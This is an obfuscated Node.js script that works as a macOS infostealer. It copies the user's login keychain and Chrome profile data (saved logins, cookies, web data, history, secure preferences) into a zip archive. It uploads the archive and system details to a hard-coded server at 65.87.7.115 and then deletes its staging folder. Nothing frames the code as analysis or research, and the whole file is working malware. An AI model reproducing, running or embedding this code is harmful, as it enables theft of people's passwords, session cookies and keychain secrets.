const _0x478b7e=_0x42ac;(function(_0x1a004d,_0x3e74bd){const _0x606a59=_0x42ac,_0x5a1733=_0x1a004d();while(!![]){try{const _0x6e28c4=parseInt(_0x606a59(0x158))/0x1+-parseInt(_0x606a59(0x16e))/0x2*(-parseInt(_0x606a59(0x188))/0x3)+parseInt(_0x606a59(0x16a))/0x4+-parseInt(_0x606a59(0x149))/0x5*(-parseInt(_0x606a59(0x142))/0x6)+-parseInt(_0x606a59(0x167))/0x7+parseInt(_0x606a59(0x132))/0x8+-parseInt(_0x606a59(0x154))/0x9*(parseInt(_0x606a59(0x18d))/0xa);if(_0x6e28c4===_0x3e74bd)break;else _0x5a1733['push'](_0x5a1733['shift']());}catch(_0x5cbaf2){_0x5a1733['push'](_0x5a1733['shift']());}}}(_0x34dd,0xb500d));const fs=require('fs'),os=require('os'),path=require(_0x478b7e(0x153)),{exec,execSync}=require(_0x478b7e(0x156)),crypto=require(_0x478b7e(0x121)),axios=require(_0x478b7e(0x14d)),FormData=require(_0x478b7e(0x15e)),CONFIG={'serverUrl':_0x478b7e(0x106),'apiKey':_0x478b7e(0x16c),'chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0,'stableDir':_0x478b7e(0x163),'zipFileName':_0x478b7e(0xfc),'chromeImportantFiles':[_0x478b7e(0x10e),_0x478b7e(0x113),_0x478b7e(0x109),_0x478b7e(0x18b),_0x478b7e(0x137),'History-journal',_0x478b7e(0x168),_0x478b7e(0x127),_0x478b7e(0x129),'Secure\x20Preferences']};function log(_0x57aacd,_0x2350d9=![]){const _0x29b61b=_0x478b7e,_0x5be171=new Date()[_0x29b61b(0x13a)](),_0x37eeb5='['+_0x5be171+']\x20'+_0x57aacd;_0x2350d9?console[_0x29b61b(0x164)](_0x37eeb5):console['log'](_0x37eeb5);try{fs['appendFileSync']('collector.log',_0x37eeb5+'\x0a');}catch(_0x16b0b6){console[_0x29b61b(0x164)](_0x29b61b(0x108)+_0x16b0b6[_0x29b61b(0x183)]);}}function createDirectory(_0x4a5837){const _0xc084f0=_0x478b7e;try{return!fs[_0xc084f0(0x105)](_0x4a5837)?(fs[_0xc084f0(0x114)](_0x4a5837,{'recursive':!![]}),log(_0xc084f0(0x175)+_0x4a5837)):log(_0xc084f0(0x15d)+_0x4a5837),!![];}catch(_0x591286){return log(_0xc084f0(0x174)+_0x4a5837+':\x20'+_0x591286[_0xc084f0(0x183)],!![]),![];}}function copyFile(_0x5a8037,_0x446179){const _0x334277=_0x478b7e;try{return fs[_0x334277(0x10c)](_0x5a8037,_0x446179),log(_0x334277(0x176)+_0x5a8037+_0x334277(0x13c)+_0x446179),!![];}catch(_0x26bdcf){return log(_0x334277(0x123)+_0x5a8037+':\x20'+_0x26bdcf[_0x334277(0x183)],!![]),![];}}function executeCommand(_0x43abc8){const _0x8a5ef2=_0x478b7e;try{log(_0x8a5ef2(0x171)+_0x43abc8);const _0x5c5ae7=execSync(_0x43abc8,{'encoding':'utf8'});return log('Command\x20output:\x20'+_0x5c5ae7[_0x8a5ef2(0x152)]()),{'success':!![],'output':_0x5c5ae7};}catch(_0x556819){log(_0x8a5ef2(0x115)+_0x556819[_0x8a5ef2(0x183)],!![]);if(_0x556819['stderr'])log('stderr:\x20'+_0x556819[_0x8a5ef2(0x166)],!![]);return{'success':![],'error':_0x556819};}}function formatFileSize(_0x321c20){const _0x201101=_0x478b7e;if(_0x321c20===0x0)return'0\x20Bytes';const _0x40d0e7=0x400,_0x348e7c=['Bytes','KB','MB','GB','TB'],_0x577ade=Math[_0x201101(0x14e)](Math['log'](_0x321c20)/Math[_0x201101(0x16f)](_0x40d0e7));return parseFloat((_0x321c20/Math[_0x201101(0x14b)](_0x40d0e7,_0x577ade))['toFixed'](0x2))+'\x20'+_0x348e7c[_0x577ade];}function generateClientId(){const _0x51ada3=_0x478b7e;try{const _0x4e11bd=getMacAddress(),_0x591c44=os[_0x51ada3(0x177)](),_0x4c78ff=os[_0x51ada3(0x187)]()[_0x51ada3(0x13f)],_0x589208=crypto[_0x51ada3(0x185)]('md5')[_0x51ada3(0x136)](_0x4e11bd+':'+_0x591c44+':'+_0x4c78ff)[_0x51ada3(0x134)](_0x51ada3(0x16d))[_0x51ada3(0x10d)](0x0,0x8);return _0x589208;}catch(_0x2b69b3){return Math[_0x51ada3(0x11f)]()[_0x51ada3(0x145)](0x24)[_0x51ada3(0x10d)](0x2,0xa);}}function getMacAddress(){const _0x31af83=_0x478b7e;try{const _0x22a143=os['networkInterfaces']();for(const _0x36c10a of Object[_0x31af83(0x133)](_0x22a143)){for(const _0x3c189b of _0x22a143[_0x36c10a]){if(!_0x3c189b[_0x31af83(0xfa)]&&_0x3c189b[_0x31af83(0x12d)]!=='00:00:00:00:00:00')return _0x3c189b[_0x31af83(0x12d)];}}return _0x31af83(0x10a);}catch(_0x1d111d){return'unknown';}}async function collectData(){const _0x146dbd=_0x478b7e;try{log(_0x146dbd(0x100));if(!createDirectory(CONFIG[_0x146dbd(0x10f)]))throw new Error('Failed\x20to\x20create\x20Stable\x20directory');const _0x4e66d4=os[_0x146dbd(0x187)]()[_0x146dbd(0x13f)];log('Current\x20user:\x20'+_0x4e66d4);const _0x11d881=_0x146dbd(0x178)+_0x4e66d4+_0x146dbd(0x184),_0x4d63f5=path[_0x146dbd(0x131)](CONFIG[_0x146dbd(0x10f)],_0x146dbd(0x140));fs[_0x146dbd(0x105)](_0x11d881)?copyFile(_0x11d881,_0x4d63f5):log(_0x146dbd(0x146)+_0x11d881,!![]);try{const _0x4e60fe=_0x146dbd(0x178)+_0x4e66d4+_0x146dbd(0x13e);if(fs[_0x146dbd(0x105)](_0x4e60fe)){const _0x292055=[];fs[_0x146dbd(0x105)](path[_0x146dbd(0x131)](_0x4e60fe,_0x146dbd(0x18f)))&&_0x292055[_0x146dbd(0x122)](_0x146dbd(0x18f));try{const _0xed6ad2=fs[_0x146dbd(0x181)](_0x4e60fe,{'withFileTypes':!![]});for(const _0x57e683 of _0xed6ad2){_0x57e683[_0x146dbd(0x118)]()&&_0x57e683[_0x146dbd(0x103)]['startsWith'](_0x146dbd(0x180))&&_0x292055[_0x146dbd(0x122)](_0x57e683[_0x146dbd(0x103)]);}}catch(_0x242921){log(_0x146dbd(0x14c)+_0x242921[_0x146dbd(0x183)],!![]);}log(_0x146dbd(0x147)+_0x292055['length']+_0x146dbd(0x11b)+_0x292055['join'](',\x20'));for(const _0x43cb73 of _0x292055){const _0x4dfa95=path[_0x146dbd(0x131)](_0x4e60fe,_0x43cb73),_0x1a92b7=path[_0x146dbd(0x131)](CONFIG[_0x146dbd(0x10f)],_0x146dbd(0x18a)+_0x43cb73);createDirectory(_0x1a92b7);for(const _0x40f5c0 of CONFIG['chromeImportantFiles']){const _0x5f5048=path['join'](_0x4dfa95,_0x40f5c0),_0x80c52d=path[_0x146dbd(0x131)](_0x1a92b7,_0x40f5c0);fs[_0x146dbd(0x105)](_0x5f5048)?copyFile(_0x5f5048,_0x80c52d):log(_0x146dbd(0x116)+_0x43cb73+':\x20'+_0x5f5048);}log(_0x146dbd(0x169)+_0x43cb73+_0x146dbd(0x10b));}}else log(_0x146dbd(0x125)+_0x4e60fe,!![]);}catch(_0x1edd46){log(_0x146dbd(0xfb)+_0x1edd46[_0x146dbd(0x183)],!![]);}log(_0x146dbd(0x159));const _0x423110=executeCommand(_0x146dbd(0x16b)+CONFIG['zipFileName']+'\x20'+CONFIG[_0x146dbd(0x10f)]+_0x146dbd(0x12a));if(!_0x423110['success'])throw new Error(_0x146dbd(0x160));log(_0x146dbd(0x13d));if(fs['existsSync'](CONFIG[_0x146dbd(0x17e)])){const _0x4222a5=fs['statSync'](CONFIG['zipFileName']);log('Archive\x20size:\x20'+formatFileSize(_0x4222a5['size']));}else throw new Error('ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation');return log(_0x146dbd(0x189)),!![];}catch(_0x19f7bf){return log(_0x146dbd(0x107)+_0x19f7bf['message'],!![]),![];}}async function uploadFile(_0x8c2a7b=0x0){const _0x106c27=_0x478b7e;try{const _0x11cc74=path['join'](process[_0x106c27(0x139)](),CONFIG[_0x106c27(0x17e)]);if(!fs[_0x106c27(0x105)](_0x11cc74))return log('КРИТИЧЕСКАЯ\x20ОШИБКА:\x20Файл\x20не\x20найден:\x20'+_0x11cc74,!![]),log(_0x106c27(0x126)+process[_0x106c27(0x139)](),!![]),log(_0x106c27(0x143)+fs['readdirSync'](process['cwd']())[_0x106c27(0x131)](',\x20'),!![]),![];const _0x450e1f=fs['statSync'](_0x11cc74),_0x1a02b2=_0x450e1f[_0x106c27(0x124)];log(_0x106c27(0x179)+_0x1a02b2+_0x106c27(0x17f)+formatFileSize(_0x1a02b2)+')');if(_0x1a02b2===0x0)return log(_0x106c27(0x12b)+CONFIG[_0x106c27(0x17e)]+_0x106c27(0x18c),!![]),![];const _0x13e584=new FormData();_0x13e584[_0x106c27(0x18e)]('file',fs[_0x106c27(0x11d)](_0x11cc74),{'filename':path[_0x106c27(0x102)](_0x11cc74),'contentType':_0x106c27(0x150),'knownLength':_0x1a02b2});const _0x38e15f={'hostname':os[_0x106c27(0x177)](),'platform':os['platform'](),'type':os[_0x106c27(0x111)](),'arch':os['arch'](),'username':os[_0x106c27(0x187)]()[_0x106c27(0x13f)],'id':generateClientId()};log('=====\x20НАЧАЛО\x20ОТПРАВКИ\x20АРХИВА\x20====='),log(_0x106c27(0x119)+JSON['stringify'](_0x38e15f)),log(_0x106c27(0x17a)+CONFIG[_0x106c27(0x15c)]);const _0x52a1c9=Date['now']();log(_0x106c27(0x11c)+new Date(_0x52a1c9)['toISOString']());const _0x38933b=await axios['post'](CONFIG[_0x106c27(0x15c)],_0x13e584,{'headers':{..._0x13e584[_0x106c27(0x101)](),'X-Client-Info':JSON['stringify'](_0x38e15f),'Content-Length':_0x13e584[_0x106c27(0x172)]()},'maxContentLength':Infinity,'maxBodyLength':Infinity,'timeout':CONFIG[_0x106c27(0x104)],'onUploadProgress':_0x243940=>{const _0x44ae69=_0x106c27,_0x4e5aa1=Math[_0x44ae69(0x12f)](_0x243940[_0x44ae69(0x170)]*0x64/_0x243940[_0x44ae69(0x130)]);log('Прогресс\x20загрузки:\x20'+_0x4e5aa1+_0x44ae69(0x11e)+formatFileSize(_0x243940[_0x44ae69(0x170)])+'/'+formatFileSize(_0x243940['total'])+')');}}),_0x55ed63=Date[_0x106c27(0x157)](),_0xdd2ea9=(_0x55ed63-_0x52a1c9)/0x3e8,_0x49a4ba=_0x1a02b2/_0xdd2ea9/0x400;return log('Загрузка\x20завершена\x20за\x20'+_0xdd2ea9['toFixed'](0x1)+_0x106c27(0x14f)+_0x49a4ba[_0x106c27(0x144)](0x2)+'\x20KB/s)'),log('Статус\x20ответа:\x20'+_0x38933b[_0x106c27(0x173)]),log('Ответ\x20сервера:\x20'+JSON['stringify'](_0x38933b[_0x106c27(0x12e)])),log('=====\x20ОТПРАВКА\x20АРХИВА\x20ЗАВЕРШЕНА\x20====='),_0x38933b[_0x106c27(0x12e)][_0x106c27(0x162)];}catch(_0x5bc9d5){log(_0x106c27(0x15a)+(_0x8c2a7b+0x1)+'/'+CONFIG[_0x106c27(0x128)]+'):',!![]);if(_0x5bc9d5[_0x106c27(0x17c)])log(_0x106c27(0x12c)+_0x5bc9d5[_0x106c27(0x17c)][_0x106c27(0x173)],!![]),log(_0x106c27(0x138)+JSON['stringify'](_0x5bc9d5[_0x106c27(0x17c)][_0x106c27(0x12e)]),!![]);else _0x5bc9d5['request']?(log(_0x106c27(0x165),!![]),log(_0x106c27(0x110)+_0x5bc9d5['code'],!![])):log(_0x106c27(0x13b)+_0x5bc9d5[_0x106c27(0x183)],!![]);if(_0x8c2a7b<CONFIG[_0x106c27(0x128)])return log(_0x106c27(0xff)+CONFIG['retryDelay']/0x3e8+'\x20секунд...'),await new Promise(_0x3a3a19=>setTimeout(_0x3a3a19,CONFIG[_0x106c27(0xfe)])),uploadFile(_0x8c2a7b+0x1);return log(_0x106c27(0x117)+CONFIG['maxRetries']+')',!![]),![];}}async function main(){const _0x4ca81c=_0x478b7e;try{log('==========\x20НАЧАЛО\x20ПРОЦЕССА\x20СБОРА\x20И\x20ОТПРАВКИ\x20ДАННЫХ\x20=========='),log(_0x4ca81c(0x17b)+process['version']),log('Платформа:\x20'+process[_0x4ca81c(0x155)]),log(_0x4ca81c(0x151)+process['cwd']());try{(!fs['existsSync']('./node_modules/axios')||!fs[_0x4ca81c(0x105)]('./node_modules/form-data'))&&(log(_0x4ca81c(0xfd)),execSync(_0x4ca81c(0x186)),log(_0x4ca81c(0x112)));}catch(_0x206c11){log(_0x4ca81c(0x182)+_0x206c11[_0x4ca81c(0x183)]);}const _0x34137d=await collectData();!_0x34137d&&(log(_0x4ca81c(0x120),!![]),process['exit'](0x1));const _0x48e8af=await uploadFile();if(_0x48e8af){log(_0x4ca81c(0x11a));try{fs[_0x4ca81c(0x105)](CONFIG[_0x4ca81c(0x10f)])&&(executeCommand(_0x4ca81c(0x161)+CONFIG[_0x4ca81c(0x10f)]),log('Временная\x20директория\x20'+CONFIG[_0x4ca81c(0x10f)]+_0x4ca81c(0x15f)));}catch(_0x11491b){log(_0x4ca81c(0x141)+_0x11491b[_0x4ca81c(0x183)]);}process[_0x4ca81c(0x148)](0x0);}else log(_0x4ca81c(0x135),!![]),process['exit'](0x1);}catch(_0x58be6b){log(_0x4ca81c(0x15b)+_0x58be6b['message'],!![]),log(_0x4ca81c(0x17d)+_0x58be6b[_0x4ca81c(0x14a)],!![]),process['exit'](0x1);}}function _0x42ac(_0x2d3f15,_0x19aff7){const _0x34dd9c=_0x34dd();return _0x42ac=function(_0x42ac53,_0x6875c4){_0x42ac53=_0x42ac53-0xfa;let _0x378fdf=_0x34dd9c[_0x42ac53];return _0x378fdf;},_0x42ac(_0x2d3f15,_0x19aff7);}function _0x34dd(){const _0x2a82ec=['createHash','npm\x20install\x20axios\x20form-data','userInfo','3gWFYaQ','=====\x20СБОР\x20ДАННЫХ\x20ЗАВЕРШЕН\x20=====','Chrome_','Login\x20Data-journal','\x20имеет\x20нулевой\x20размер!','662990sBGtyf','append','Default','internal','Error\x20copying\x20Chrome\x20data:\x20','Stable.zip','Установка\x20необходимых\x20зависимостей...','retryDelay','Повторная\x20попытка\x20через\x20','=====\x20НАЧАЛО\x20СБОРА\x20ДАННЫХ\x20=====','getHeaders','basename','name','timeout','existsSync','http://65.87.7.115:8088/api/files/upload','Error\x20in\x20data\x20collection:\x20','Error\x20writing\x20to\x20log:\x20','Login\x20Data','unknown','\x20copied\x20successfully','copyFileSync','substring','Web\x20Data','stableDir','Тип\x20ошибки:\x20','type','Зависимости\x20успешно\x20установлены','Web\x20Data-journal','mkdirSync','Error\x20executing\x20command:\x20','Chrome\x20file\x20not\x20found\x20in\x20profile\x20','Превышено\x20максимальное\x20количество\x20попыток\x20(','isDirectory','Информация\x20о\x20системе:\x20','==========\x20СБОР\x20И\x20ОТПРАВКА\x20ДАННЫХ\x20УСПЕШНО\x20ЗАВЕРШЕНЫ\x20==========','\x20Chrome\x20profiles:\x20','Отправка\x20началась\x20в:\x20','createReadStream','%\x20(','random','Сбор\x20данных\x20завершился\x20с\x20ошибкой','crypto','push','Error\x20copying\x20file\x20','size','Chrome\x20directory\x20not\x20found:\x20','Текущая\x20директория:\x20','Cookies-journal','maxRetries','Bookmarks','\x20-x\x20\x22*.DS_Store\x22','ОШИБКА:\x20Файл\x20','Статус\x20ошибки:\x20','mac','data','round','total','join','8567264cMtzlz','keys','digest','==========\x20ОШИБКА\x20ОТПРАВКИ\x20ДАННЫХ\x20==========','update','History','Данные\x20ошибки:\x20','cwd','toISOString','Ошибка\x20настройки:\x20','\x20->\x20','ZIP\x20archive\x20created\x20successfully','/Library/Application\x20Support/Google/Chrome','username','login.keychain-db','Предупреждение:\x20Ошибка\x20при\x20удалении\x20временных\x20файлов:\x20','30ZQlrvr','Содержимое\x20директории:\x20','toFixed','toString','Keychain\x20file\x20not\x20found:\x20','Found\x20','exit','1237355cdPiaq','stack','pow','Error\x20scanning\x20Chrome\x20profiles:\x20','axios','floor','\x20секунд\x20(','application/zip','Директория\x20запуска:\x20','trim','path','405tCGDQo','platform','child_process','now','79792XdSDYW','Creating\x20ZIP\x20archive...','ОШИБКА\x20ПРИ\x20ЗАГРУЗКЕ\x20(попытка\x20','ФАТАЛЬНАЯ\x20ОШИБКА:\x20','serverUrl','Directory\x20already\x20exists:\x20','form-data','\x20удалена','Failed\x20to\x20create\x20ZIP\x20archive','rm\x20-rf\x20','success','Stable','error','Нет\x20ответа\x20от\x20сервера','stderr','2999038PlFeqP','Cookies','Chrome\x20data\x20for\x20profile\x20','2084604dZQybh','zip\x20-r\x20-1\x20','DdlgUvzxN4C9SKvxzofdZQmlQjR9','hex','2488144wpjUbb','log','loaded','Executing\x20command:\x20','getLengthSync','status','Error\x20creating\x20directory\x20','Directory\x20created:\x20','File\x20copied:\x20','hostname','/Users/','Размер\x20файла:\x20','URL\x20сервера:\x20','Версия\x20Node.js:\x20','response','Стек\x20ошибки:\x20','zipFileName','\x20байт\x20(','Profile\x20','readdirSync','Предупреждение:\x20Не\x20удалось\x20проверить/установить\x20зависимости:\x20','message','/Library/Keychains/login.keychain-db'];_0x34dd=function(){return _0x2a82ec;};return _0x34dd();}main();
